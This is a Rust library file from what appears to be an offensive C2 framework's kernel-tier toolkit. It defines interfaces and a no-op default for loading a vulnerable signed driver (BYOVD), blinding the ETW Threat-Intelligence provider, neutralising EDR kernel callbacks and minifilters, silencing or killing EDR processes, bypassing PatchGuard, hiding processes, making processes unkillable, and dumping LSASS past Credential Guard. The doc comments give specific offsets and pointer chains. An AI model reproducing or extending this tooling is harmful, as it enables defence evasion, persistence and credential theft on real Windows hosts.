//! nyx-operator-kernelsdk — operator-side kernel-tier kit seams (P2.2+).
//!
//! **This crate is seams-only.** Every kernel capability is a Rust trait with a
//! no-op floor default (`NoKernel`); real implementations plug in as
//! `impl Trait for …` blocks and are selected at runtime by the operator based on
//! the chosen bootstrap path (KslD / driverless CVE / DMA / BYOVD / runtime-PG).
//! Adding an impl never edits these traits or the call sites — same contract as
//! the implant-side `kits.rs` (`SleepmaskKit`/`ProcessInjectKit`).
//!
//! ## Why a separate, standalone crate
//! The PIC implant (`implant-win`) cannot host a kernel driver, so kernel-tier
//! tooling is operator-side (runs on the operator's staging host or a delivered
//! loader, not inside the beacon). It lives in its own empty `[workspace]` so
//! `cargo build --workspace` in the repo root stays green on the dev host.
//!
//! ## HVCI degradation contract
//! `KernelRw` impls MUST detect HVCI-on hosts and refuse code-page writes
//! (`KrwError::HvciCodePage`); data-section manipulation stays allowed. The
//! `KernelTier` assembler turns this into automatic fallback to the userland
//! floor when a kernel op is unavailable under HVCI.
//!
//! ## Status (2026-06)
//! ALL 10 kits have real implementations now (algorithms over `&dyn KernelRw`,
//! unit-tested with a mock; none kernel-loaded on this host):
//! - `etwti::EtwTiBlind` — ETW-TI provider blind (chase
//!   `EtwThreatIntProvRegHandle → GUID entry → EnableInfo → IsEnabled=0`).
//!   Version-forked by UBR (RTM 0x050 vs patched 0x060); HVCI-safe data write.
//! - `byovd::ByovdDriver` — BYOVD `KernelRw` over a driver IOCTL channel
//!   (`RtCore64` CVE-2019-16098 reference) + pure ntoskrnl export resolver.
//! - `telemetry::CallbackNeutralizer` — Ps*NotifyRoutine ret-stub overwrite.
//! - `telemetry::MiniFilterUnlinker` — fltmgr RegisteredFilters LIST_ENTRY unlink.
//! - `persistence::ProcessHider` — ActiveProcessLinks unlink (DKOM).
//! - `persistence::PplStripper` — EPROCESS.Protection + SignatureLevel zero.
//! - `persistence::TimingRepairWindow` / `RuntimePgBypassWindow` — the two real
//!   PatchGuard bypass windows, selected by `win::select_pg_window` (capability-
//!   driven: PG-context offsets table + `supports_thread_suspend` flag).
//!   ⚠ EXPERIMENTAL (kernelsdk-1-1): the PG-context table rows are PLACEHOLDER
//!   offsets (0x190/0x08, never PDB-verified) — `select_pg_window` gates on
//!   `PgContextOffsets::verified` and returns `None` for every build until
//!   per-build validation lands. The bypass code paths stay; the capability
//!   is OFF rather than silently wrong.
//! - `netsec::UserModeEdrSilencer` — WFP block-rule templates (FFI operator-side).
//! - `netsec::KernelLsassReader` — DTB read + page-walk orchestration shell.
//! - `netsec::EdrNeutralizer` — Kill/Freeze/Choke tiers (framework).
//!
//! **The driver LOAD step is operator-side and never runs in dev** — loading a
//! vulnerable signed driver into the kernel is irreversible (BSOD risk) +
//! Defender-flagging; reserved for the authorized target. Bootstrap priority
//! (see `docs/p2-2026-kernel-tier-deepdive.md` §0): KslD.sys (Living off the
//! Defender) > driverless CVE-2026-40369 > DMA/PCILeech > runtime-PG bypass >
//! BYOVD (fallback).

#![cfg_attr(not(test), no_std)]
#![forbid(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::boxed::Box;
use alloc::string::String;
use alloc::vec::Vec;
use core::fmt;

/// BYOVD `KernelRw` bootstrap (P2.2 §1) — CODE SHIPPED, NOT LOADED. The driver
/// IOCTL binding (`ByovdDriver` + `VulnDriverIoctl` + `RtCore64` reference) +
/// ntoskrnl symbol resolution are real and unit-tested; the driver LOAD step
/// is operator-side and never runs on this host.
pub mod byovd;
pub mod byovd_drivers;
/// CFG bitmap manipulation — mark NtContinue as valid call target via kernel r/w.
/// Used to enable Ekko/Foliage sleep obfuscation on CFG-enabled processes
/// where CreateTimerQueueTimer callbacks are blocked by Control Flow Guard.
pub mod cfg;
/// ETW Deception — event forgery + frequency keeper (Bypass Complete Phase 4).
/// Forges synthetic ETW events that match real kernel-provider cadence, defeating
/// frequency/content-based detection when the ETW-TI blind is active.
pub mod etw_deception;
/// ETW-TI provider kernel blind — REAL algorithm (P2.2 §2.1). Given a working
/// `KernelRw`, chases `EtwThreatIntProvRegHandle → provider block → EnableInfo`
/// and writes `IsEnabled=0`. HVCI-safe (data section). Unit-tested with a mock
/// KernelRw; the bootstrap (BYOVD/driverless/DMA `KernelRw` impl + symbol
/// resolution) lands in Part B / the operator's chosen path.
pub mod etwti;
/// Network/credential/neutralize kits (P2.2 §2.4/§2.5/§4): `UserModeEdrSilencer`
/// (WFP rule templates), `KernelLsassReader` (DTB + page-walk shell),
/// `EdrNeutralizer` (Kill/Freeze/Choke tiers). Algorithm + framework.
pub mod netsec;
/// Version-pinned kernel structure offsets + dynamic multi-version probe.
///
/// Provides a table of known EPROCESS offsets for 14 Windows builds
/// (10240–26200), a floor-match lookup ([`offsets::for_build`]), and a
/// DefenderDump-style dynamic probe ([`offsets::probe_eprocess_offsets`])
/// that discovers offsets at runtime from a live kernel.
///
/// Every constant in the legacy `eprocess` module cites its source
/// (EDRSandblast CSV / Vergilius / fluxsec.red). The kits below all
/// consume [`offsets::EprocessOffsets`] — getting one wrong is a bugcheck,
/// so they're centralised + unit-tested here.
pub mod offsets;
/// x64 4-level page-table walk (VA→PA) — pure algorithm, host-testable.
/// Used by netsec (cross-process LSASS read) + win/va_rw (kernel VA read/write).
pub mod pagewalk;
/// ntoskrnl pattern scan (byte-signature → RVA) — pure algorithm, host-testable.
/// The fallback offset resolver for unknown builds.
pub mod pattern_scan;
/// Persistence/protection kits (P2.2 §3): `ProcessHider` (ActiveProcessLinks
/// unlink), `PplStripper` (Protection.Level zero), `PatchGuardWindow`
/// (DKOM-window state machine). Mock-tested.
pub mod persistence;
/// Telemetry neutralization kits (P2.2 §2.2/§2.3): `CallbackNeutralizer`
/// (Ps*NotifyRoutine ret-stub) + `MiniFilterUnlinker` (RegisteredFilters
/// unlink). Algorithms over `&dyn KernelRw`; mock-tested.
pub mod telemetry;
/// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
/// symbol resolution). Empty for now — algorithms live in the sibling modules;
/// this is where the Windows-only bootstrap lands.
#[cfg(target_os = "windows")]
pub mod win;

// ---- Errors ---------------------------------------------------------------

/// Failure of a kernel R/W primitive (the foundation every other kit builds on).
#[derive(Debug)]
#[non_exhaustive]
pub enum KrwError {
    /// HVCI is on and the target address is a code page — EPT makes it read-only,
    /// a write would VM-exit → bugcheck. Impl must refuse and let the tier
    /// degrade to the userland floor rather than crash the host.
    HvciCodePage,
    /// Structure offset could not be resolved at runtime (version mismatch).
    /// Impls MUST resolve offsets dynamically (e.g. via ntoskrnl-metadata style
    /// RVA chasing); hardcoding is a bug.
    UnresolvedOffset(&'static str),
    /// The kernel's layout is not recognized by the structural invariants a
    /// runtime probe relies on (corrupted structure, or a genuinely novel
    /// EPROCESS redesign). Distinct from [`Self::UnresolvedOffset`]: the
    /// structure exists but its shape violates the probe's invariants, so no
    /// offset is produced rather than a wrong one.
    UnsupportedPosture(&'static str),
    /// Bootstrap primitive not available on this host (driver blocked, no DMA
    /// hardware, CVE patched, …).
    Unavailable(&'static str),
    /// Partial transfer; `ok` is how many bytes actually moved.
    Partial { ok: usize },
    /// Impl-specific diagnostic.
    Other(String),
}

/// Failure of a higher-level kit (callback/minifilter/WFP/PG/PPL/cred).
#[derive(Debug)]
#[non_exhaustive]
pub enum KitError {
    /// Depends on a KernelRw that is not present / failed.
    NoPrimitive(KrwError),
    /// Operation not supported in the current HVCI/PG/SKPG posture.
    UnsupportedPosture(&'static str),
    /// Nothing to act on (e.g. no EDR callbacks found).
    NotFound,
    Other(String),
}

impl fmt::Display for KrwError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::HvciCodePage => f.write_str("HVCI-on: code page is EPT read-only"),
            Self::UnresolvedOffset(s) => write!(f, "unresolved kernel offset: {s}"),
            Self::UnsupportedPosture(s) => write!(f, "unsupported kernel posture: {s}"),
            Self::Unavailable(s) => write!(f, "kernel primitive unavailable: {s}"),
            Self::Partial { ok } => write!(f, "partial kernel transfer ({ok} bytes)"),
            Self::Other(s) => f.write_str(s),
        }
    }
}
impl fmt::Display for KitError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoPrimitive(e) => write!(f, "kernel primitive error: {e}"),
            Self::UnsupportedPosture(s) => write!(f, "unsupported posture: {s}"),
            Self::NotFound => f.write_str("nothing to act on"),
            Self::Other(s) => f.write_str(s),
        }
    }
}
impl From<KrwError> for KitError {
    fn from(e: KrwError) -> Self {
        Self::NoPrimitive(e)
    }
}

// ---- §1 KernelRw: the foundation ------------------------------------------

/// Arbitrary kernel read/write. Every other kit takes `&dyn KernelRw`.
///
/// Planned impls: `ByovdDriver`, `DmaPciLeech`, `DriverlessCve` (CVE-2026-40369),
/// `LivingOffDefender` (KslD.sys), `Cr3Ioctl`.
pub trait KernelRw: Send + Sync {
    /// Read `dst.len()` bytes from kernel VA `kaddr`. Offsets are resolved at
    /// runtime by the impl — never hardcoded.
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError>;

    /// Write `src` to kernel VA `kaddr`. Data sections only under HVCI; a code
    /// page write returns `KrwError::HvciCodePage` (impl MUST probe, not crash).
    fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError>;

    /// Convenience: read a little-endian u64 (default over `kread`).
    fn kread_u64(&self, kaddr: usize) -> Result<u64, KrwError> {
        let mut b = [0u8; 8];
        self.kread(kaddr, &mut b)?;
        Ok(u64::from_le_bytes(b))
    }

    /// Convenience: write a little-endian u64 (default over `kwrite`).
    fn kwrite_u64(&self, kaddr: usize, val: u64) -> Result<(), KrwError> {
        self.kwrite(kaddr, &val.to_le_bytes())
    }
}

// ---- §1.5 Kernel assessment (T-REX T4-T5, real) ---------------------------

/// Whether a [`KernelAssessment`] reflects real kernel data.
///
/// Honest-status marker: `Assessed` means at least one of the two user-mode
/// `NtQuerySystemInformation` paths (module enumeration / code integrity)
/// returned real data. `NotAssessed` means the assessment could not run — the
/// remaining fields are unset, NEVER evidence of a clean kernel.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum KernelAssessmentStatus {
    /// Assessment completed against real kernel data.
    Assessed,
    /// Assessment could not run — the kernel queries are unavailable here. The
    /// remaining fields are unset, NOT evidence of a clean kernel.
    #[default]
    NotAssessed,
}

/// Kernel-layer posture report (T-REX T4-T5) — the operator-side replacement
/// for the implant's user-mode kernel stubs. Produced by [`assess_kernel`]
/// over a live `KernelRw` (BYOVD / KslD / DMA).
#[derive(Debug, Clone, Copy, Default)]
pub struct KernelAssessment {
    /// Whether the fields below reflect a real assessment. `NotAssessed`
    /// (default) means the posture is unknown — never interpret zeroed fields
    /// as a clean kernel.
    pub status: KernelAssessmentStatus,
    /// Loaded kernel modules (incl. ntoskrnl), counted from
    /// `NtQuerySystemInformation(SystemModuleInformation)`.
    pub total_drivers: u32,
    /// Loaded modules whose file name matches a known EDR driver name.
    pub edr_drivers: u32,
    /// ETW-TI provider (`Microsoft-Windows-Threat-Intelligence`) enabled — an
    /// EDR is subscribed. Read via the same chase `EtwTiBlind` uses.
    pub etw_ti_active: bool,
    /// Non-zero `EX_CALLBACK` slots in `PspCreateProcessNotifyRoutine` (64-slot).
    pub process_callbacks: u32,
    /// Non-zero `EX_CALLBACK` slots in `PspLoadImageNotifyRoutine` (64-slot).
    pub image_load_callbacks: u32,
    /// Non-zero slots in `CmpCallBackVector`. No verified pattern site exists
    /// yet — honestly 0 when the window cannot be resolved.
    pub registry_callbacks: u32,
    /// `CODEINTEGRITY_OPTION_TESTSIGN` (bit 1 of the System Code Integrity options).
    pub test_signing_enabled: bool,
    /// `KUSER_SHARED_DATA.KdDebuggerEnabled` — kernel debugger attached.
    pub kernel_debugger_present: bool,
    /// `HVCI_KMCI_ENABLED` (bit 9 of the System Code Integrity options).
    pub hvci_enabled: bool,
    /// VBS enabled (approximate — bit 12 of the System Code Integrity options).
    pub vbs_enabled: bool,
}

/// Run a real T4-T5 kernel assessment over a live kernel read/write primitive.
///
/// On Windows this enumerates kernel modules, reads the System Code Integrity
/// options, counts the Ps*NotifyRoutine callback arrays (the pattern-scan path
/// shared with `win::resolve_offsets`), and probes the ETW-TI provider enable
/// state — the assessment the implant's user-mode T-REX could never produce
/// (see `crates/implant-win/src/trex/mod.rs` module docs). On non-Windows
/// hosts there is nothing to measure: the result is honestly `NotAssessed`.
///
/// `status` is `Assessed` iff at least one of the two user-mode NtQuery paths
/// (module enumeration / code integrity) returned real data; a completely
/// failed assessment is `NotAssessed` — never a fabricated 'clean'.
///
/// # Safety
/// On Windows, reads kernel memory via `krw` (callback arrays + ETW-TI
/// provider chain) and calls `NtQuerySystemInformation`. Single-threaded
/// operator context.
pub unsafe fn assess_kernel(krw: &dyn KernelRw) -> KernelAssessment {
    #[cfg(target_os = "windows")]
    {
        // SAFETY: documented on the function; the Windows impl validates every
        // read and treats failures as "not measured", never fabricated.
        unsafe { crate::win::assess::assess_kernel_impl(krw) }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = krw;
        KernelAssessment {
            status: KernelAssessmentStatus::NotAssessed,
            ..KernelAssessment::default()
        }
    }
}

// ---- §2 Telemetry neutralization ------------------------------------------

/// §2.1 — ETW-TI blind. Single QWORD write to `ProviderEnableInfo.IsEnabled=0`
/// after chasing `nt!EtwThreatIntProvRegHandle → +0x020 → +0x060`. HVCI-safe
/// (data section).
pub trait EtwTiKit {
    /// Blind the ETW-TI provider. Idempotent.
    fn blind(&self, krw: &dyn KernelRw) -> Result<(), KitError>;
    /// Self-check: is the provider currently disabled? (Sanctum/Peregrine probe
    /// `ProviderEnableInfo` integrity, so an impl may also forge "still enabled".)
    fn is_blinded(&self, krw: &dyn KernelRw) -> Result<bool, KitError>;
}

/// §2.2 — Ps/Ob/Cm kernel callbacks. Overwrite with a KCFG-compliant `ret`-only
/// stub (NEVER null — PatchGuard bugchecks on null callback entries). The
/// "repurpose" variant redirects to an attacker routine instead of a ret-stub.
pub trait CallbackKit {
    /// Enumerate EDR callbacks and overwrite each with a ret-stub. Returns the
    /// count neutralized.
    fn neutralize(&self, krw: &dyn KernelRw) -> Result<usize, KitError>;
    /// Stealthier variant: point callbacks at `redirect` (a legitimate-looking
    /// routine) so they still fire but no-op for the EDR.
    fn repurpose(&self, krw: &dyn KernelRw, redirect: usize) -> Result<(), KitError>;
}

/// §2.3 — MiniFilter unlink from the FltGlobals list. Bypasses kCFG (kCFG
/// guards dispatch tables, not list links). HVCI-safe.
pub trait MiniFilterKit {
    fn detach_edr(&self, krw: &dyn KernelRw) -> Result<(), KitError>;
}

/// §2.4 — WFP. Two impls planned: `UserModeEdrSilencer` (admin, no driver,
/// leaves Event ID 5447 + packet-drop traces) and `KernelCalloutOverwrite`.
/// A third, lower-noise path — QoS starvation via `EDRChoker` (`pacer.sys`,
/// below WFP) — lives in `EdrNeutralizeKit::Choke`.
pub trait WfpKit {
    /// Silence the given EDR PIDs by installing WFP block filters.
    ///
    /// Returns a [`netsec::WfpSilenceGuard`] whose Drop removes every filter
    /// added by this call (closing the BFE session). The caller MUST hold the
    /// guard for as long as the silence should remain in effect — dropping it
    /// restores the EDR's network telemetry. This makes silence scoped and
    /// residue-free: there's no separate "un-silence" call to forget.
    fn silence_edr(&self, edr_pids: &[u32]) -> Result<netsec::WfpSilenceGuard, KitError>;
}

/// §2.5 — EDR process neutralization. Three noise tiers.
#[derive(Debug, Clone, Copy)]
pub enum NeutralizeMethod {
    /// Kernel `ZwTerminateProcess` (bypasses PPL). Highest noise + finality.
    Kill,
    /// WerFaultSecure + MiniDumpWriteDump "coma" (user-mode, bypasses PPL, admin).
    Freeze,
    /// EDRChoker QoS throttle to 8 bit/s via `pacer.sys` (user-mode, admin,
    /// lowest noise — no WFP/packet-drop traces).
    Choke,
}
pub trait EdrNeutralizeKit {
    fn neutralize(&self, pid: u32, m: NeutralizeMethod) -> Result<(), KitError>;

    /// Resolve the target EPROCESS KVA for the Kill tier (kernel
    /// ZwTerminateProcess via a driver IOCTL / PplStripper flow). The trait
    /// has no KernelRw param, so this is a separate method; implementations
    /// without the kernel helper return a clear UnsupportedPosture instead of
    /// a false success.
    fn kill_kva(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<usize, KitError> {
        Err(KitError::UnsupportedPosture(
            "Kill: this kit implementation has no kernel-r/w Kill tier",
        ))
    }
}

// ---- §3 Persistence / protection ------------------------------------------

/// §3.1/3.2 — PatchGuard-aware unchecked window. Two impls: `RuntimePgBypass`
/// (kurasagi / TheiaPg class, Win11 24H2-25H2) and `OutflankTimingRepair`
/// (data-only DKOM + repair in the terminate callback before PspProcessDelete).
/// The returned guard's `Drop` repairs / re-arms — do not leak it.
pub trait PatchGuardKit {
    fn enter_unchecked(&self, krw: &dyn KernelRw) -> Result<PgGuard<'_>, KitError>;
}

/// RAII guard: the unchecked window is open while it lives; `Drop` repairs.
/// Borrows the kit so it cannot be dropped mid-window.
///
/// The `repair` callback is set by the specific PG bypass implementation
/// (`TimingRepairWindow` or `RuntimePgBypassWindow`) and performs the
/// necessary cleanup when the guard is dropped — e.g., re-enabling PG
/// validation or resuming the suspended validation thread.
#[must_use = "the PG guard repairs on Drop; leaking it leaves the kernel tampered"]
pub struct PgGuard<'a> {
    // Lifetime anchor: ties the guard's lifetime to the kit so the kit cannot
    // be dropped mid-window. Never read at runtime — the field exists for the
    // borrow-checker guarantee.
    #[allow(dead_code)]
    kit: &'a dyn PatchGuardKit,
    /// Repair callback invoked on Drop. Set by the concrete PG bypass impl.
    /// When `Some`, the closure performs PG state restoration (re-arm, thread
    /// resume, etc.).
    repair: Option<alloc::boxed::Box<dyn FnMut() + 'a>>,
}

impl<'a> PgGuard<'a> {
    /// Create a new PgGuard with a repair callback. Called by the concrete
    /// PG bypass impls (`TimingRepairWindow`, `RuntimePgBypassWindow`).
    pub fn new(kit: &'a dyn PatchGuardKit, repair_fn: impl FnMut() + 'a) -> Self {
        Self {
            kit,
            repair: Some(alloc::boxed::Box::new(repair_fn)),
        }
    }
}

impl<'a> Drop for PgGuard<'a> {
    fn drop(&mut self) {
        // Invoke the repair callback if one was set by the concrete impl.
        // This performs PG state restoration: re-enabling the validation flag,
        // resuming the suspended thread, etc.
        if let Some(mut repair) = self.repair.take() {
            repair();
        }
    }
}

/// §3.2 — Hide a process via EPROCESS.ActiveProcessLinks unlink under a PG guard.
pub trait ProcHideKit {
    fn hide(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
}

/// §3.3 — PPL, both directions: attack an EDR PPL process, or promote our own
/// process to PPL ("Process Immortality" — un-killable / un-dumpable).
pub trait PplKit {
    fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
    /// Promote `pid` to PPL (Protected | WinSystem). Requires a `KernelRw` to
    /// write `EPROCESS.Protection` + `SignatureLevel` + `SectionSignatureLevel`.
    /// Once promoted the process is unkillable and undumpable from user-mode.
    fn make_immortal(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
}

// ---- §4 Credentials -------------------------------------------------------

/// §4 — Kernel-mode credential access: read LSASS memory directly via the
/// kernel primitive, bypassing RunAsPPL + Credential Guard. (Current Nyx
/// `hashdump` is user-mode SAM-hive; this is its kernel-tier upgrade.)
pub trait CredKit {
    /// Dump LSASS memory for `pid`; returns the raw bytes (NOT a minidump —
    /// see [`Self::dump_lsass_with_base`] for the VA the bytes were read from,
    /// which the operator needs to wrap them in a minidump envelope).
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError>;

    /// Dump LSASS memory for `pid` AND return the virtual address the bytes
    /// were captured from (LSASS's `ImageBaseAddress` from its PEB). The base
    /// VA is needed by the operator-side minidump assembler to populate the
    /// `Memory64List`'s `StartOfMemoryRange`.
    ///
    /// Default impl: calls `dump_lsass` and returns base=0 (the floor impls
    /// that don't override this lose the VA, which the operator can detect
    /// and surface as a warning). Real impls (`KernelLsassReader`) override.
    fn dump_lsass_with_base(
        &self,
        krw: &dyn KernelRw,
        pid: u32,
    ) -> Result<(Vec<u8>, u64), KitError> {
        let bytes = self.dump_lsass(krw, pid)?;
        Ok((bytes, 0))
    }
}

// ---- §5 Floor default -----------------------------------------------------

/// No-op floor for every kit. Used when no kernel primitive is available
/// (HVCI-on with no data-section path, operator declined kernel tier, …) so
/// the `KernelTier` still assembles and degrades cleanly to the userland floor.
pub struct NoKernel;

impl KernelRw for NoKernel {
    fn kread(&self, _kaddr: usize, _dst: &mut [u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("NoKernel floor"))
    }
    fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
        Err(KrwError::Unavailable("NoKernel floor"))
    }
}
impl EtwTiKit for NoKernel {
    fn blind(&self, _krw: &dyn KernelRw) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    // Previously returned `Ok(false)` — falsely claimed "ETW-TI provider is
    // ENABLED / not blinded", hiding the fact that no kernel primitive is
    // available to read the provider's IsEnabled field. Now honestly reports
    // UnsupportedPosture, consistent with every other NoKernel method.
    // Callers MUST handle this with a `match` (do NOT `?`-propagate into a
    // hard exit; log and treat as "blinded state unknown").
    fn is_blinded(&self, _krw: &dyn KernelRw) -> Result<bool, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl CallbackKit for NoKernel {
    fn neutralize(&self, _krw: &dyn KernelRw) -> Result<usize, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    fn repurpose(&self, _krw: &dyn KernelRw, _redirect: usize) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl MiniFilterKit for NoKernel {
    fn detach_edr(&self, _krw: &dyn KernelRw) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl WfpKit for NoKernel {
    fn silence_edr(&self, _edr_pids: &[u32]) -> Result<netsec::WfpSilenceGuard, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl EdrNeutralizeKit for NoKernel {
    fn neutralize(&self, _pid: u32, _m: NeutralizeMethod) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl PatchGuardKit for NoKernel {
    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<PgGuard<'_>, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl ProcHideKit for NoKernel {
    fn hide(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl PplKit for NoKernel {
    fn attack_edr_ppl(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
    fn make_immortal(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}
impl CredKit for NoKernel {
    fn dump_lsass(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<Vec<u8>, KitError> {
        Err(KitError::UnsupportedPosture("NoKernel floor"))
    }
}

// ---- §6 Assembled tier ----------------------------------------------------

/// Opaque handle to a loaded kernel driver (the BYOVD `LoadedDriver`).
///
/// [`KernelTier::loaded_driver`] holds this behind a trait object so the
/// non-cfg-gated `KernelTier` (defined here in lib.rs) can store the
/// Windows-only `LoadedDriver`. The only operation that matters is the
/// explicit unload (NtUnloadDriver + registry-key cleanup) — there is
/// deliberately no auto-unload on drop (the operator may keep a driver loaded
/// across operations; the tier's [`KernelTier::unload_driver`] is the cleanup
/// path).
pub trait DriverHandle: Send + Sync {
    /// Unload the driver (NtUnloadDriver) + delete its registry service key.
    /// Best-effort; safe to call once — a second unload fails harmlessly.
    fn unload(&mut self);
}

/// An engagement's kernel tier, assembled at runtime after the operator picks a
/// bootstrap path. `rw` is the LIVE kernel primitive (moved out of the
/// `KernelBootstrap` by `assemble_tier`); the rest are optional kits that
/// degrade to `None` when their required offsets aren't resolved.
///
/// `loaded_driver` holds the BYOVD `LoadedDriver` (for explicit unload by the
/// operator via [`KernelTier::unload_driver`]). It does NOT auto-unload on
/// drop (by design — see `LoadedDriver`'s Drop). KslD path leaves this `None`.
///
/// PG windows are NOT stored here (they borrow `&dyn KernelRw` for their
/// repair callback and can't outlive `rw`). Use `select_pg_window(build,
/// &*tier.rw)` at the call site.
pub struct KernelTier {
    pub rw: Box<dyn KernelRw>,
    pub etw_ti: Option<Box<dyn EtwTiKit>>,
    pub callbacks: Option<Box<dyn CallbackKit>>,
    pub minifilter: Option<Box<dyn MiniFilterKit>>,
    pub wfp: Option<Box<dyn WfpKit>>,
    pub hide: Option<Box<dyn ProcHideKit>>,
    pub ppl: Option<Box<dyn PplKit>>,
    pub cred: Option<Box<dyn CredKit>>,
    /// EDR process neutralize (Kill/Freeze/Choke). Kill needs a kernel
    /// primitive via `EdrNeutralizer::kill(krw, pid)` directly; Freeze/Choke
    /// are user-mode tiers that run real FFI when this is `Some`.
    pub neutralize: Option<Box<dyn EdrNeutralizeKit>>,
    /// BYOVD loaded driver (for explicit unload via [`KernelTier::unload_driver`]).
    /// Opaque [`DriverHandle`] box so the non-cfg-gated `KernelTier` (defined
    /// here in lib.rs) can hold the Windows-only `LoadedDriver`. `None` for
    /// KslD path.
    pub loaded_driver: Option<Box<dyn DriverHandle>>,
}

impl KernelTier {
    /// Floor tier: no kernel primitive. Every op degrades to the userland floor.
    pub fn floor() -> Self {
        Self {
            rw: Box::new(NoKernel),
            etw_ti: None,
            callbacks: None,
            minifilter: None,
            wfp: None,
            hide: None,
            ppl: None,
            cred: None,
            neutralize: None,
            loaded_driver: None,
        }
    }

    /// Explicitly unload the BYOVD driver held by this tier, if any.
    ///
    /// This is the documented cleanup flow for the BYOVD bootstrap
    /// (kernelsdk-1-2): the driver does NOT auto-unload on drop (the operator
    /// may keep it loaded across ops), so the tier hands out the handle with
    /// this method. On success the driver has been unloaded (NtUnloadDriver)
    /// and its registry service key deleted, `self.loaded_driver` is `None`,
    /// and the returned box lets the caller confirm what was unloaded. KslD
    /// path (no loaded driver) returns `None` and does nothing.
    pub fn unload_driver(&mut self) -> Option<Box<dyn DriverHandle>> {
        if let Some(mut driver) = self.loaded_driver.take() {
            driver.unload();
            Some(driver)
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use alloc::sync::Arc;
    use core::sync::atomic::{AtomicUsize, Ordering};

    /// Minimal `DriverHandle` that counts unload calls (host-testable stand-in
    /// for the Windows-only `LoadedDriver`).
    struct MockDriver {
        unload_count: Arc<AtomicUsize>,
    }

    impl DriverHandle for MockDriver {
        fn unload(&mut self) {
            self.unload_count.fetch_add(1, Ordering::SeqCst);
        }
    }

    #[test]
    fn unload_driver_unloads_exactly_once_and_clears_field() {
        // Nothing loaded (KslD path) → None, no-op.
        let mut tier = KernelTier::floor();
        assert!(tier.unload_driver().is_none());

        // Loaded driver → unload_driver runs unload() exactly once, clears
        // the field, and returns the handle so the caller can confirm.
        let count = Arc::new(AtomicUsize::new(0));
        tier.loaded_driver = Some(Box::new(MockDriver {
            unload_count: Arc::clone(&count),
        }));
        assert_eq!(count.load(Ordering::SeqCst), 0);

        let handle = tier.unload_driver();
        assert!(handle.is_some());
        assert_eq!(count.load(Ordering::SeqCst), 1, "unload must run exactly once");
        assert!(tier.loaded_driver.is_none(), "field must be cleared after unload");

        // Second call is a harmless no-op (idempotent contract).
        assert!(tier.unload_driver().is_none());
        assert_eq!(count.load(Ordering::SeqCst), 1);
    }
}
